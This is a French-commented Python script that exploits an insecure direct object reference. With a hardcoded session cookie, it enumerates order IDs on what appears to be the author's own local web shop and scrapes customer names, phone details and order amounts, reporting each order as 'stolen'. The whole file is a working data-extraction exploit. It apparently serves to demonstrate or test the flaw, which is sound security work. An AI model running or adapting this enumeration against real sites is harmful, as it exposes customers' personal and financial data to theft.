import requests
from bs4 import BeautifulSoup
import time

# ---------------- CONFIGURATION ----------------
# L'URL de ton site (local)
BASE_URL = "http://127.0.0.1:5555"

SESSION_COOKIE = ".eJwdjEEKhDAQBP_S5xzijIniZ4bRTEA0Comelv37ut4aqqo_WFrNcp2bHZgweB6tHzn2xClTII1ZzUjz0kWmGQ7WLtFU1kfvHNq5J5NSb0zBc_De4W5WZU0v_u9Diz3XbyOzVt0U3x-twSWx.aVbubw.kkHAbGMnpevxH7tx69itP1aN354"

# Plage d'IDs Ã  scanner
ID_DEBUT = 1
ID_FIN = 20


# -----------------------------------------------

def run_exploit():
    print("ðŸ’€ DÃ©marrage du script d'extraction de donnÃ©es...")
    print(f"ðŸŽ¯ Cible : {BASE_URL}")
    print("-" * 40)

    cookies = {'session': SESSION_COOKIE}
    total_chiffre_affaire = 0
    commandes_trouvees = 0

    for id_commande in range(ID_DEBUT, ID_FIN + 1):
        url = f"{BASE_URL}/commande/{id_commande}"

        try:
            # 1. On visite la page
            response = requests.get(url, cookies=cookies)

            # 2. Si la page renvoie "Commande introuvable", on passe
            if "Commande introuvable" in response.text:
                # print(f"[-] Commande #{id_commande} : Inexistante")
                continue

            # 3. Analyse du HTML pour trouver le montant
            soup = BeautifulSoup(response.text, 'html.parser')

            # On cherche la cellule qui contient "MRU" (selon ton template HTML)
            # Dans ton tableau, c'est la derniÃ¨re cellule <td>
            cellules = soup.find_all('td')

            if cellules:
                # La derniÃ¨re cellule contient le montant
                texte_montant = cellules[-1].get_text().strip()

                # Nettoyage : on garde juste les chiffres (on vire " MRU")
                montant_str = texte_montant.replace(' MRU', '').replace(' ', '')
                montant = float(montant_str)
                client_info = cellules[1].get_text(separator=" ").strip()
                # .get_text(separator=" ") permet de sÃ©parer le Nom du Tel

                print(f"[+] ðŸ’° Commande #{id_commande} volÃ©e !")
                print(f"    â”œâ”€ Client : {client_info[:30]}...")  # On affiche juste le dÃ©but
                print(f"    â””â”€ Montant: {montant} MRU")

                total_chiffre_affaire += montant
                commandes_trouvees += 1

                # Petite pause pour ne pas faire planter le serveur
                time.sleep(0.1)

        except Exception as e:
            print(f"[!] Erreur sur l'ID {id_commande}: {e}")

    print("-" * 40)
    print("âœ… Extraction terminÃ©e.")
    print(f"ðŸ“Š Commandes rÃ©cupÃ©rÃ©es : {commandes_trouvees}")
    print(f"ðŸ’° CHIFFRE D'AFFAIRES TOTAL ESTIMÃ‰ : {total_chiffre_affaire:,.2f} MRU")


if __name__ == "__main__":
    run_exploit()